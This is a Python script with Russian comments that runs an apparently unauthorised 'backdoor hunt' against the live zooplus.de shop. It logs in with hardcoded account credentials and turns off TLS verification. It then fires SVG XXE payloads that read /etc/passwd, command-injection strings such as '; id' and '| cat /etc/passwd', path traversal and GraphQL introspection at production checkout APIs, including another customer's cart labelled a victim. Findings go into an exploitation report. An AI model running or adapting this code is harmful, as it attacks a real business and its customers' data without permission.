#!/usr/bin/env python3
"""Deep Backdoor Hunt - используя известные endpoints"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

found_vulns = []

# 1. Используем state-api для поиска других endpoints
print("\n[1] Analyzing state-api/get response for hidden endpoints...")
try:
    resp = s.post(f"{base}/semiprotected/api/checkout/state-api/v2/get", json={}, timeout=5, verify=False)
    if resp.status_code == 200:
        data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        data_str = json.dumps(data)
        
        # Extract URLs
        urls = re.findall(r'["\'](/[^"\']+api[^"\']+)["\']', data_str)
        urls += re.findall(r'["\'](/[^"\']+upload[^"\']+)["\']', data_str)
        urls += re.findall(r'["\'](/[^"\']+graphql[^"\']+)["\']', data_str)
        
        print(f"  Found {len(set(urls))} potential endpoints in state response")
        for url in set(urls)[:10]:
            if len(url) < 200:
                print(f"    {url}")
except: pass

# 2. Тестируем state-api с file upload payload
print("\n[2] Testing state-api with file upload payloads...")
state_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/upload",
    "/semiprotected/api/checkout/state-api/v2/file",
    "/semiprotected/api/checkout/state-api/v2/attachment",
]

svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'

for ep in state_endpoints:
    try:
        files = {'file': ('x.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201]:
            if "root:" in resp.text:
                print(f"  [CRITICAL] SVG XXE via state-api: {ep}")
                found_vulns.append({"type": "svg_xxe_lfi", "severity": "CRITICAL", "endpoint": ep})
    except: pass

# 3. Тестируем cart-api на file upload
print("\n[3] Testing cart-api for file upload...")
VICTIM_CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
cart_upload_endpoints = [
    f"/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}/upload",
    f"/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}/attachment",
    f"/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}/file",
]

for ep in cart_upload_endpoints:
    try:
        files = {'file': ('x.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201]:
            if "root:" in resp.text:
                print(f"  [CRITICAL] SVG XXE via cart-api: {ep}")
                found_vulns.append({"type": "svg_xxe_lfi", "severity": "CRITICAL", "endpoint": ep})
    except: pass

# 4. Тестируем state-api на command injection
print("\n[4] Testing state-api for command injection...")
endpoint = "/semiprotected/api/checkout/state-api/v2/set-article-quantity"

cmd_payloads = [
    {"articleId": "2966422; id", "quantity": 1},
    {"articleId": "2966422 | whoami", "quantity": 1},
    {"articleId": 2966422, "quantity": "1; id"},
    {"articleId": 2966422, "quantity": "1 | cat /etc/passwd"},
]

for payload in cmd_payloads:
    try:
        resp = s.put(f"{base}{endpoint}", json=payload, timeout=3, verify=False)
        if resp.status_code == 200:
            if "uid=" in resp.text or "gid=" in resp.text or "root:" in resp.text:
                print(f"  [CRITICAL] Command injection: {payload}")
                found_vulns.append({"type": "command_injection_rce", "severity": "CRITICAL", "endpoint": endpoint, "payload": payload})
    except: pass

# 5. Тестируем state-api на path traversal
print("\n[5] Testing state-api for path traversal...")
traversal_payloads = [
    {"articleId": "../../../etc/passwd", "quantity": 1},
    {"articleId": "..\\..\\..\\etc\\passwd", "quantity": 1},
    {"file": "../../../etc/passwd"},
    {"path": "../../../etc/passwd"},
]

for payload in traversal_payloads:
    try:
        resp = s.post(f"{base}/semiprotected/api/checkout/state-api/v2/get", json=payload, timeout=3, verify=False)
        if resp.status_code == 200:
            if "root:" in resp.text:
                print(f"  [CRITICAL] Path traversal: {payload}")
                found_vulns.append({"type": "path_traversal_lfi", "severity": "CRITICAL", "endpoint": "/semiprotected/api/checkout/state-api/v2/get", "payload": payload})
    except: pass

# 6. Тестируем GraphQL через известные пути
print("\n[6] Testing GraphQL with known patterns...")
# Попробуем найти GraphQL через анализ ответов
try:
    resp = s.get(f"{base}/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}", timeout=5, verify=False)
    if resp.status_code == 200:
        data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        data_str = json.dumps(data)
        
        # Ищем GraphQL endpoints в ответе
        graphql_patterns = re.findall(r'["\'](/[^"\']*graphql[^"\']*)["\']', data_str)
        for pattern in graphql_patterns:
            try:
                resp2 = s.post(f"{base}{pattern}", json={"query": "{__schema{types{name}}}"}, timeout=3, verify=False)
                if resp2.status_code == 200 and '__schema' in resp2.text:
                    print(f"  [CRITICAL] GraphQL found: {pattern}")
                    found_vulns.append({"type": "graphql_introspection", "severity": "CRITICAL", "endpoint": pattern})
            except: pass
except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'payload' in v:
            print(f"    Payload: {v['payload']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ УЯЗВИМОСТИ - БЕКДОР\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{json.dumps(v['payload'])}`\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated")
else:
    print("  No vulnerabilities found")

print("=" * 70)

